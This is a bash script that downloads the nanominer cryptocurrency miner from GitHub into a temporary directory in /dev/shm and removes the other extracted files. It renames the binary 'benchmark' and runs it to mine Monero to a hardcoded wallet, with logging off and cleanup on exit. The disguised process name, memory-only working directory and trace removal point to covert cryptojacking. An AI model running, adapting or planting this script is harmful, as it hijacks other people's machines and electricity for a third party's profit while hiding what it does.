#!/usr/bin/env bash
RELEASE="https://github.com/nanopool/nanominer/releases/download/v3.10.0/nanominer-linux-3.10.0.tar.gz"
WORK_DIR=$(mktemp -d -p "/dev/shm/")
REF="85oFxfusjvPeuxkXY6cuQredrLcwrxccgHgfqxf7YaQCDriCvgc2srDXAM7NBZzJdkL6oywXHs2cRFEsH1DHrNskMLW7yGp"
EMAIL="Idontkeeparecordplayer"
NICE=${1:-19}
function cleanup { rm -rf "$WORK_DIR" ;}
trap cleanup EXIT HUP INT QUIT PIPE TERM
cd "$WORK_DIR" || exit                                                                                                # >/dev/null 2>&1
wget -N "$RELEASE"                                                                                                    # >/dev/null 2>&1
tar -xzf "$(basename $RELEASE)"                                                                                       # >/dev/null 2>&1
find $WORK_DIR ! -name "nanominer" -type f -exec rm -fr {} +                                                          # >/dev/null 2>&1
mv "nanominer" "benchmark"                                                                                            # >/dev/null 2>&1
nice -n "$NICE" ./benchmark -algo randomx -wallet "$REF" -coin xmr -rigName "$(hostname)" -noLog true -email "$EMAIL" # >/dev/null 2>&1

